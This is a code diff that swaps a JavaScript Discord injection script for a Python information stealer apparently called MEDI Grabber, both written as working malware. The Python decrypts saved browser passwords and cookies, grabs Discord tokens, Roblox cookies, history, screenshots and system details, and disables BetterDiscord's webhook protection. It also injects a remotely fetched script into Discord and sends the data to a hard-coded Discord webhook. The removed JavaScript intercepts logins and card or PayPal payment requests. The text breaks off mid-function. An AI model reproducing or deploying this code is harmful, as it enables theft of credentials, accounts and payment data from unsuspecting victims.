@@ -1,970 +1,751 @@
-const args = process.argv;
-const fs = require('fs');
-const path = require('path');
-const https = require('https');
-const querystring = require('querystring');
-const { BrowserWindow, session } = require('electron');
+import os,json,shutil,base64,sqlite3,zipfile,requests,subprocess,psutil,random,ctypes,sys,re,datetime,time,traceback
+from pickle import TRUE
+from threading import Thread
+from PIL import ImageGrab
+from win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
 
-const config = {
-  webhook: 'https://discord.com/api/webhooks/1093253146215714969/EXRAYk5yCrEcAnhQskMDBl7abF2qn_NQf7IYO8sdt1wPKfrRUsRGqpXK0Yhv6O6x9P7f', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
-  auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', //injection url for when it reinjects
 
-  api: 'https://discord.com/api/v9/users/@me',
-  nitro: {
-    boost: {
-      year: {
-        id: '521847234246082599',
-        sku: '511651885459963904',
-        price: '9999',
-      },
-      month: {
-        id: '521847234246082599',
-        sku: '511651880837840896',
-        price: '999',
-      },
-    },
-    classic: {
-      month: {
-        id: '521846918637420545',
-        sku: '511651871736201216',
-        price: '499',
-      },
-    },
-  },
-  filter: {
-    urls: [
-      'https://discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/users/@me',
-      'https://*.discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/auth/login',
-      'https://discord.com/api/v*/auth/login',
-      'https://*.discord.com/api/v*/auth/login',
-      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
-      'https://api.stripe.com/v*/tokens',
-      'https://api.stripe.com/v*/setup_intents/*/confirm',
-      'https://api.stripe.com/v*/payment_intents/*/confirm',
-    ],
-  },
-  filter2: {
-    urls: [
-      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
-      'https://*.discord.com/api/v*/applications/detectable',
-      'https://discord.com/api/v*/applications/detectable',
-      'https://*.discord.com/api/v*/users/@me/library',
-      'https://discord.com/api/v*/users/@me/library',
-      'wss://remote-auth-gateway.discord.gg/*',
-    ],
-  },
-};
-
-function parity_32(x, y, z) {
-  return x ^ y ^ z;
+config = {
+    ### Key:
+    # Webhook: Webhook to send to discord.
+    # Persist: Add to startup? (True/False, Bool)
+    # Keep-Alive: Keep process running? (Will execute every hour, True/False, Bool)
+    # Injection URL: Raw URL to injection payload
+    # Inject: Inject payload into Discord? (True/False, Bool)
+    # AntiVM: Protect against debuggers? (Recommended, True/False, Bool)
+    # HideConsole: Hide the console? (Similar to PyInstallers -w/--noconsole option, but less detections, (True/False, Bool)
+    # Force Admin: Bypass Admin Privileges? (May not work, True/False, Bool)
+    # Black Screen: Make screen black? (True/False, Bool)
+    # Error Message: Fake error text to display. (Leave Blank for None)
+    '%WEBHOOK%': 'https://discord.com/api/webhooks/1093253155569012877/AQ60JgF4BE8Ch2Y5I71onqPmYjs6h_jv4UMh8YYjrVmVHBJ-cbhNVuzk8iAJulZKNi6k'
+    'webhook': 'https://discord.com/api/webhooks/1093253155569012877/AQ60JgF4BE8Ch2Y5I71onqPmYjs6h_jv4UMh8YYjrVmVHBJ-cbhNVuzk8iAJulZKNi6k',
+    'persist': False,
+    'keep-alive': False,
+    'injection_url': 'https://raw.githubusercontent.com/PsxScripts01/inject/main/injection.js',
+    'inject': True,
+    'hideconsole': True,
+    'antivm': True,
+    'force_admin': False,
+    'black_screen': False,
+    'error': False,
+    'error_message': 'This application failed to start because MSCVDLL.dll is missing.\n\nPlease download the latest version of Microsoft C++ Compiler and try again.',
 }
-function ch_32(x, y, z) {
-  return (x & y) ^ (~x & z);
-}
+class functions(object):
+    def getHeaders(self, token:str=None, content_type="application/json") -> dict:
+        headers = {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
+        if token: headers.update({"Authorization": token})
+        return headers
+    def get_master_key(self, path) -> str:
+        with open(path, "r", encoding="utf-8") as f: local_state = f.read()
+        local_state = json.loads(local_state)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    def decrypt_val(self, buff, master_key) -> str:
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except Exception: return f'Failed to decrypt "{str(buff)}" | Key: "{str(master_key)}"'
+    def fsize(self, path):
+        path = internal.tempfolder + os.sep + path
+        if os.path.isfile(path): size = os.path.getsize(path)/1024
+        else:
+            total = 0
+            with os.scandir(path) as it:
+                for entry in it:
+                    if entry.is_file():
+                        total += entry.stat().st_size
+                    elif entry.is_dir():
+                        total += self.fsize(entry.path)
+            size = total/1024
+        if size > 1024: size = "{:.1f} MB".format(size/1024)
+        else: size = "{:.1f} KB".format(size)
+        return size
+    def gen_tree(self, path):
+        ret = ""
+        fcount = 0
+        for dirpath, dirnames, filenames in os.walk(path):
+            directory_level = dirpath.replace(path, "")
+            directory_level = directory_level.count(os.sep)
+            indent = "│ "
+            ret += f"\n{indent*directory_level}📁 {os.path.basename(dirpath)}/"
+            for n, f in enumerate(filenames):
+                if f == f'MEDI_Grabber-{os.getlogin()}.zip': continue
+                indent2 = indent if n != len(filenames) - 1 else "└ "
+                ret += f"\n{indent*(directory_level)}{indent2}{f} ({self.fsize((os.path.basename(dirpath)+os.sep if dirpath.split(os.sep)[-1] != internal.tempfolder.split(os.sep)[-1] else '')+f)})"
+                fcount += 1
+        return ret, fcount
+    def system(self, action):
+        return '\n'.join(line for line in subprocess.check_output(action, creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip())
+class internal:
+    tempfolder = None
+    stolen = False
+class ticks(functions, internal):
+    def __init__(self,useless):
+        del useless
+        if config.get('error'): Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, config.get('error_message'), os.path.basename(sys.argv[0]), 0x1 | 0x10)).start()
+        try: admin = ctypes.windll.shell32.IsUserAnAdmin()
+        except Exception: admin = False
+        if not admin and config['force_admin'] and '--nouacbypass' not in sys.argv: self.forceadmin()
+        self.webhook = config.get('webhook')
+        self.exceptions = []
+        self.baseurl = "https://discord.com/api/v9/users/@me"
+        self.appdata = os.getenv("localappdata")
+        self.roaming = os.getenv("appdata")
+        dirs = [
+            self.appdata,
+            self.roaming,
+            os.getenv('temp'),
+            'C:\\Users\\Public\\Public Music',
+            'C:\\Users\\Public\\Public Pictures',
+            'C:\\Users\\Public\\Public Videos',
+            'C:\\Users\\Public\\Public Documents',
+            'C:\\Users\\Public\\Public Downloads',
+            os.getenv('userprofile'),
+            os.getenv('userprofile') + '\\Documents',
+            os.getenv('userprofile') + '\\Music',
+            os.getenv('userprofile') + '\\Pictures',
+            os.getenv('userprofile') + '\\Videos'
+        ]
+        while True:
+            rootpath = random.choice(dirs)
+            if os.path.exists(rootpath):
+                self.tempfolder = os.path.join(rootpath,''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
+                break
+        internal.tempfolder = self.tempfolder
 
-function maj_32(x, y, z) {
-  return (x & y) ^ (x & z) ^ (y & z);
-}
-function rotl_32(x, n) {
-  return (x << n) | (x >>> (32 - n));
-}
-function safeAdd_32_2(a, b) {
-  var lsw = (a & 0xffff) + (b & 0xffff),
-    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);
-
-  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
-}
-function safeAdd_32_5(a, b, c, d, e) {
-  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
-    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);
-
-  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
-}
-function binb2hex(binarray) {
-  var hex_tab = '0123456789abcdef',
-    str = '',
-    length = binarray.length * 4,
-    i,
-    srcByte;
-
-  for (i = 0; i < length; i += 1) {
-    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
-    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
-  }
-
-  return str;
-}
-
-function getH() {
-  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
-}
-function roundSHA1(block, H) {
-  var W = [],
-    a,
-    b,
-    c,
-    d,
-    e,
-    T,
-    ch = ch_32,
-    parity = parity_32,
-    maj = maj_32,
-    rotl = rotl_32,
-    safeAdd_2 = safeAdd_32_2,
-    t,
-    safeAdd_5 = safeAdd_32_5;
-
-  a = H[0];
-  b = H[1];
-  c = H[2];
-  d = H[3];
-  e = H[4];
-
-  for (t = 0; t < 80; t += 1) {
-    if (t < 16) {
-      W[t] = block[t];
-    } else {
-      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
-    }
-
-    if (t < 20) {
-      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
-    } else if (t < 40) {
-      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
-    } else if (t < 60) {
-      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
-    } else {
-      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
-    }
-
-    e = d;
-    d = c;
-    c = rotl(b, 30);
-    b = a;
-    a = T;
-  }
-
-  H[0] = safeAdd_2(a, H[0]);
-  H[1] = safeAdd_2(b, H[1]);
-  H[2] = safeAdd_2(c, H[2]);
-  H[3] = safeAdd_2(d, H[3]);
-  H[4] = safeAdd_2(e, H[4]);
-
-  return H;
-}
-
-function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
-  var i, appendedMessageLength, offset;
-
-  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
-  while (remainder.length <= offset) {
-    remainder.push(0);
-  }
-  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
-  remainder[offset] = remainderBinLen + processedBinLen;
-  appendedMessageLength = remainder.length;
-
-  for (i = 0; i < appendedMessageLength; i += 16) {
-    H = roundSHA1(remainder.slice(i, i + 16), H);
-  }
-  return H;
-}
-
-function hex2binb(str, existingBin, existingBinLen) {
-  var bin,
-    length = str.length,
-    i,
-    num,
-    intOffset,
-    byteOffset,
-    existingByteLen;
-
-  bin = existingBin || [0];
-  existingBinLen = existingBinLen || 0;
-  existingByteLen = existingBinLen >>> 3;
-
-  if (0 !== length % 2) {
-    console.error('String of HEX type must be in byte increments');
-  }
-
-  for (i = 0; i < length; i += 2) {
-    num = parseInt(str.substr(i, 2), 16);
-    if (!isNaN(num)) {
-      byteOffset = (i >>> 1) + existingByteLen;
-      intOffset = byteOffset >>> 2;
-      while (bin.length <= intOffset) {
-        bin.push(0);
-      }
-      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
-    } else {
-      console.error('String of HEX type contains invalid characters');
-    }
-  }
-
-  return { value: bin, binLen: length * 4 + existingBinLen };
-}
-
-class jsSHA {
-  constructor() {
-    var processedLen = 0,
-      remainder = [],
-      remainderLen = 0,
-      intermediateH,
-      converterFunc,
-      outputBinLen,
-      variantBlockSize,
-      roundFunc,
-      finalizeFunc,
-      finalized = false,
-      hmacKeySet = false,
-      keyWithIPad = [],
-      keyWithOPad = [],
-      numRounds,
-      numRounds = 1;
-
-    converterFunc = hex2binb;
-
-    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
-      console.error('numRounds must a integer >= 1');
-    }
-    variantBlockSize = 512;
-    roundFunc = roundSHA1;
-    finalizeFunc = finalizeSHA1;
-    outputBinLen = 160;
-    intermediateH = getH();
-
-    this.setHMACKey = function (key) {
-      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
-      keyConverterFunc = hex2binb;
-      convertRet = keyConverterFunc(key);
-      keyBinLen = convertRet['binLen'];
-      keyToUse = convertRet['value'];
-      blockByteSize = variantBlockSize >>> 3;
-      lastArrayIndex = blockByteSize / 4 - 1;
-
-      if (blockByteSize < keyBinLen / 8) {
-        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
-        while (keyToUse.length <= lastArrayIndex) {
-          keyToUse.push(0);
+        self.browserpaths = {
+            'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
+            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
+            'Edge': self.appdata + r'\\Microsoft\\Edge\\User Data',
+            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data',
+            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data',
+            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data',
+            'Amigo': self.appdata + r'\\Amigo\\User Data',
+            'Torch': self.appdata + r'\\Torch\\User Data',
+            'Kometa': self.appdata + r'\\Kometa\\User Data',
+            'Orbitum': self.appdata + r'\\Orbitum\\User Data',
+            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data',
+            '7Star': self.appdata + r'\\7Star\\7Star\\User Data',
+            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data',
+            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data',
+            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data',
+            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data',
+            'Chrome Beta': self.appdata + r'\\Google\\Chrome Beta\\User Data',
+            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data',
+            'Iridium': self.appdata + r'\\Iridium\\User Data',
+            'Chromium': self.appdata + r'\\Chromium\\User Data'
         }
-        keyToUse[lastArrayIndex] &= 0xffffff00;
-      } else if (blockByteSize > keyBinLen / 8) {
-        while (keyToUse.length <= lastArrayIndex) {
-          keyToUse.push(0);
+        self.stats = {
+            'passwords': 0,
+            'tokens': 0,
+            'phones': 0,
+            'addresses': 0,
+            'cards': 0,
+            'cookies': 0
         }
-        keyToUse[lastArrayIndex] &= 0xffffff00;
-      }
+        try:
+            os.makedirs(os.path.join(self.tempfolder), 0x1ED, exist_ok=True)
+            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x2)
+            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x4)
+            ctypes.windll.kernel32.SetFileAttributesW(self.tempfolder,0x256)
+        except Exception: self.exceptions.append(traceback.format_exc())
+        os.chdir(self.tempfolder)
+        if config.get('persist') and not self.stolen: Thread(target=self.persist).start()
+        if config.get('inject'): Thread(target=self.injector).start()
+        self.tokens = []
+        self.robloxcookies = []
+        self.files = ""
+        
+        threads = [Thread(target=self.screenshot),Thread(target=self.grabMinecraftCache),Thread(target=self.grabGDSave),Thread(target=self.tokenRun),Thread(target=self.grabRobloxCookie),Thread(target=self.getSysInfo)]
+        for plt, pth in self.browserpaths.items(): threads.append(Thread(target=self.grabBrowserInfo,args=(plt,pth)))
+        for thread in threads: thread.start()
+        for thread in threads: thread.join()
+        
+        if self.exceptions:
+            with open(self.tempfolder+'\\Errory.txt','w',encoding='utf-8') as f:
+                f.write('\n'.join(self.exceptions))
 
-      for (i = 0; i <= lastArrayIndex; i += 1) {
-        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
-        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
-      }
+        self.SendInfo()
 
-      intermediateH = roundFunc(keyWithIPad, intermediateH);
-      processedLen = variantBlockSize;
+        shutil.rmtree(self.tempfolder)
+        if config.get('black_screen'): self.system('start ms-cxh-full://0')
+    def tokenRun(self):
+        self.grabTokens()
+        self.neatifyTokens()
+    def getSysInfo(self):
+            with open(self.tempfolder+f'\\PC Info.txt', "w", encoding="utf8", errors='ignore') as f:
+                try: cpu = self.system(r'wmic cpu get name').splitlines()[1]
+                except Exception: cpu = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: gpu = self.system(r'wmic path win32_VideoController get name').splitlines()[1]
+                except Exception: gpu = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: screensize = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
+                except Exception: screensize = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: refreshrate = self.system(r'wmic path win32_VideoController get currentrefreshrate').splitlines()[1]
+                except Exception: refreshrate = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: osname = 'Windows ' + self.system(r'wmic os get version').splitlines()[1]
+                except Exception: osname = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: systemslots = self.system(r'wmic systemslot get slotdesignation,currentusage,description,status')
+                except Exception: systemslots = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: processes = self.system(r'tasklist')
+                except Exception: processes = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: installedapps = '\n'.join(self.system(r'powershell Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName').splitlines()[3:])
+                except Exception: installedapps = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: path = self.system(r'set').replace('=',' = ')
+                except Exception: path = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: buildmnf = self.system(r'wmic bios get manufacturer').splitlines()[1]
+                except Exception: buildmnf = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: modelname = self.system(r'wmic csproduct get name').splitlines()[1]
+                except Exception: modelname = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: hwid = self.system(r'wmic csproduct get uuid').splitlines()[1]
+                except Exception: hwid = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: avlist = ', '.join(self.system(r'wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayname').splitlines()[1:])
+                except Exception: avlist = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: username = os.getlogin()
+                except Exception: username = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: pcname = self.system(r'hostname')
+                except Exception: pcname = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: productinfo = self.getProductValues()
+                except Exception: productinfo = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: buildname = productinfo[0]
+                except Exception: buildname = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: windowskey = productinfo[1]
+                except Exception: windowskey = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
+                except Exception: ram = 'N/A'; self.exceptions.append(traceback.format_exc())
+                try: disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
+                except Exception: disk = 'N/A'; self.exceptions.append(traceback.format_exc())
+                sep = '='*40
+                f.write(f'''{sep}
+                BUDOWA 
+{sep}
 
-      hmacKeySet = true;
-    };
+CPU: {cpu}
+GPU: {gpu}
 
-    this.update = function (srcString) {
-      var convertRet,
-        chunkBinLen,
-        chunkIntLen,
-        chunk,
-        i,
-        updateProcessedLen = 0,
-        variantBlockIntInc = variantBlockSize >>> 5;
+RAM: {ram} GB
+Rozmiar Dysku: {disk} GB
 
-      convertRet = converterFunc(srcString, remainder, remainderLen);
-      chunkBinLen = convertRet['binLen'];
-      chunk = convertRet['value'];
+PC Manufacturer: {buildmnf}
+Nazwa Modelu: {modelname}
 
-      chunkIntLen = chunkBinLen >>> 5;
-      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
-        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
-          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
-          updateProcessedLen += variantBlockSize;
+Ekran Info:
+Rozdzielczość: {screensize}
+Odświeżanie Monitora: {refreshrate}Hz
+
+Sloty Pc:
+{systemslots}
+
+{sep}
+                   SYSTEM
+{sep}
+
+Nazwa Użytkonwika: {username}
+PC Name: {pcname}
+
+Wersja Systemu: {osname}
+Edycja: {buildname}
+Klucz Windows: {windowskey}
+HWID: {hwid}
+Antivirus: {avlist}
+
+{sep}
+                  Ścieżka
+{sep}
+
+{path}
+
+{sep}
+             Zainstalowane Aplikacja
+{sep}
+
+{installedapps}
+
+{sep}
+            Odpalone Procesy
+{sep}
+
+{sep}
+             MEDI TU BYŁ
+{sep}
+
+{processes}
+''')
+
+    def checkToken(self, tkn, source):
+        try:
+            r = requests.get(self.baseurl, headers=self.getHeaders(tkn))
+            if r.status_code == 200 and tkn not in [token[0] for token in self.tokens]:
+                self.tokens.append((tkn, source))
+                self.stats['tokens'] += 1
+        except Exception: self.exceptions.append(traceback.format_exc())
+    def bypassBetterDiscord(self):
+        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
+        if os.path.exists(bd):
+            with open(bd, 'r', encoding="utf8", errors='ignore') as f:
+                txt = f.read()
+                content = txt.replace('api/webhooks', 'api/nethooks')
+            with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
+    def grabBrowserInfo(self, platform, path):
+        if os.path.exists(path):
+            self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.formatted_cookies = ''
+            sep = '='*40
+            fname = lambda x: f'\\{platform} Info ({x}).txt'
+            formatter = lambda p, c, h, m: f'Przeglądarka: {platform}\n\n{sep}\n               Hasła\n{sep}\n\n{p}\n{sep}\n                Cookie\n{sep}\n\n{c}\n{sep}\n                Historia\n{sep}\n\n{h}\n{sep}\n               Inne Informacje\n{sep}\n\n{m}'
+            profiles = ['Default']
+            for dir in os.listdir(path):
+                if dir.startswith('Profile ') and os.path.isdir(dir): profiles.append(dir)
+            if platform in [
+                'Opera',
+                'Opera GX',
+                'Amigo',
+                'Torch',
+                'Kometa',
+                'Orbitum',
+                'CentBrowser',
+                '7Star',
+                'Sputnik',
+                'Chrome SxS',
+                'Epic Privacy Browser',
+            ]:
+                cpath = path + '\\Network\\Cookies'
+                ppath = path + '\\Login Data'
+                hpath = path + '\\History'
+                wpath = path + '\\Web Data'
+                mkpath = path + '\\Local State'
+                fname = f'\\{platform} Info (Default).txt'
+                threads = [
+                    Thread(target=self.grabPasswords,args=[mkpath,platform,'Default',ppath]),
+                    Thread(target=self.grabCookies,args=[mkpath,platform,'Default',cpath]),
+                    Thread(target=self.grabHistory,args=[mkpath,platform,'Default',hpath]),
+                    Thread(target=self.grabMisc,args=[mkpath,platform,'Default',wpath])
+                ]
+                for x in threads:
+                    x.start()
+                for x in threads:
+                    x.join()
+                try: self.grabPasswords(mkpath,fname,ppath); self.grabCookies(mkpath,fname,cpath); self.grabHistory(mkpath,fname,hpath); self.grabMisc(mkpath,fname,wpath)
+                except Exception: self.exceptions.append(traceback.format_exc())
+            else:
+                for profile in profiles:
+                    cpath = path + f'\\{profile}\\Network\\Cookies'
+                    ppath = path + f'\\{profile}\\Login Data'
+                    hpath = path + f'\\{profile}\\History'
+                    wpath = path + f'\\{profile}\\Web Data'
+                    mkpath = path + '\\Local State'
+                    fname = f'\\{platform} Info ({profile}).txt'
+                    threads = [
+                        Thread(target=self.grabPasswords,args=[mkpath,platform,profile,ppath]),
+                        Thread(target=self.grabCookies,args=[mkpath,platform,profile,cpath]),
+                        Thread(target=self.grabHistory,args=[mkpath,platform,profile,hpath]),
+                        Thread(target=self.grabMisc,args=[mkpath,platform,profile,wpath])
+                    ]
+                    for x in threads:
+                        x.start()
+                    for x in threads:
+                        x.join()
+            with open(self.tempfolder+f'\\{platform} Cookie ({profile}).txt', "w", encoding="utf8", errors='ignore') as m, open(self.tempfolder+fname, "w", encoding="utf8", errors='ignore') as f:
+                if self.formatted_cookies:
+                    m.write(self.formatted_cookies)
+                else:
+                    m.close()
+                    os.remove(self.tempfolder+f'\\{platform} Cookie ({profile}).txt')
+                
+                if self.passwords_temp or self.cookies_temp or self.history_temp or self.misc_temp:
+                    f.write(formatter(self.passwords_temp, self.cookies_temp, self.history_temp, self.misc_temp))
+                else:
+                    f.close()
+                    os.remove(self.tempfolder+fname)
+    def injector(self):
+        self.bypassBetterDiscord()
+        for dir in os.listdir(self.appdata):
+            if 'discord' in dir.lower():
+                discord = self.appdata+f'\\{dir}'
+                disc_sep = discord+'\\'
+                for _dir in os.listdir(os.path.abspath(discord)):
+                    if re.match(r'app-(\d*\.\d*)*', _dir):
+                        app = os.path.abspath(disc_sep+_dir)
+                        for x in os.listdir(os.path.join(app,'modules')):
+                            if x.startswith('discord_desktop_core-'):
+                                inj_path = app+f'\\modules\\{x}\\discord_desktop_core\\'
+                                if os.path.exists(inj_path):
+                                    f = requests.get(config.get('injection_url')).text.replace("%WEBHOOK%", self.webhook)
+                                    with open(inj_path+'index.js', 'w', errors="ignore") as indexFile: indexFile.write(f)
+
+    def getProductValues(self):
+        try: wkey = self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
+        except Exception: wkey = "N/A (Likely Pirated)"
+        try: productName = self.system(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName")
+        except Exception: productName = "N/A"
+        return [productName, wkey]
+    def grabPasswords(self,mkp,bname,pname,data):
+        self.passwords_temp = ''
+        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_PASSWORDS.db'.replace(' ','_'))
+        master_key = self.get_master_key(mkp)
+        login_db = data
+        try: shutil.copy2(login_db, newdb)
+        except Exception: self.exceptions.append(traceback.format_exc())
+        conn = sqlite3.connect(newdb)
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            for r in cursor.fetchall():
+                url = r[0]
+                username = r[1]
+                encrypted_password = r[2]
+                decrypted_password = self.decrypt_val(encrypted_password, master_key)
+                if url != "":
+                    self.passwords_temp += f"\nLink: {url}\nUzytkownik: {username}\nHaslo: {decrypted_password}\n"
+                    self.stats['passwords'] += 1
+        except Exception: self.exceptions.append(traceback.format_exc())
+        cursor.close()
+        conn.close()
+        try: os.remove(newdb)
+        except Exception: self.exceptions.append(traceback.format_exc())
+    def grabCookies(self,mkp,bname,pname,data):
+        self.cookies_temp = ''
+        self.formatted_cookies = ''
+        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_COOKIES.db'.replace(' ','_'))
+        master_key = self.get_master_key(mkp)
+        login_db = data
+        try: shutil.copy2(login_db, newdb)
+        except Exception: self.exceptions.append(traceback.format_exc())
+        conn = sqlite3.connect(newdb)
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+            for r in cursor.fetchall():
+                host = r[0]
+                user = r[1]
+                decrypted_cookie = self.decrypt_val(r[2], master_key)
+                if host != "":
+                    self.cookies_temp += f"\nLink: {host}\nUzytkownik: {user}\nCookie: {decrypted_cookie}\n"
+                    self.formatted_cookies += f"{host}	TRUE	/	FALSE	1708726694	{user}	{decrypted_cookie}\n"
+                    self.stats['cookies'] += 1
+                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)
+        except Exception: self.exceptions.append(traceback.format_exc())
+        cursor.close()
+        conn.close()
+        try: os.remove(newdb)
+        except Exception: self.exceptions.append(traceback.format_exc())
+    def grabHistory(self,mkp,bname,pname,data):
+        self.history_temp = ''
+        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_HISTORY.db'.replace(' ','_'))
+        login_db = data
+        try: shutil.copy2(login_db, newdb)
+        except Exception: self.exceptions.append(traceback.format_exc())
+        conn = sqlite3.connect(newdb)
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT title, url, visit_count, last_visit_time FROM urls")
+            for r in cursor.fetchall()[::-1]:
+                title = r[0]
+                url = r[1]
+                count = r[2]
+                time = r[3]
+                time_neat = str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=time))[:-7].replace('-','/')
+                if url != "":
+                    self.history_temp += f"\nLink: {title}\nTytuł: {url}\nLiczba Wizyt: {count}\nOstatnia Wizyta: {time_neat}\n"
+        except Exception: self.exceptions.append(traceback.format_exc())
+        cursor.close()
+        conn.close()
+        try: os.remove(newdb)
+        except Exception: self.exceptions.append(traceback.format_exc())
+    def grabMisc(self,mkp,bname,pname,data):
+        self.misc_temp = ''
+        newdb = os.path.join(self.tempfolder,f'{bname}_{pname}_WEBDATA.db'.replace(' ','_'))
+        master_key = self.get_master_key(mkp)
+        login_db = data
